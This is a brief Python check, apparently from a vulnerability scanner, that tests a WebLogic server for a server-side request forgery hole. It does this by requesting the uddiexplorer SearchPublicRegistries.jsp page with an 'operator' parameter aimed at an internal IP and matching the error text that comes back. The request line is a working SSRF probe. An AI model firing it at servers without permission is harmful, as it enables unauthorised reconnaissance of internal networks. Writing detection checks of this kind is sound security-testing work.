#-*- coding: utf-8 -*-

import re
from exp.lib.httpparse import httpparse

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if weblogic ssrf vul')
    http = httpparse()
    tag = 'Received a response from url: http://10.30.1.61 which did not have a valid SOAP'
    try:
        tm = http.httpreq('GET', protocol, ip, port,'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.30.1.61&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search')
        if (re.search(tag,str(tm[2]),re.I)) and tm[0] == 200:
            msg = 'There is weblogic ssrf vul on url: ' +url+ ' .'
            number = 'v60'
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no weblogic ssrf vul'
    number = 'v0'
    return False,url,number,msg

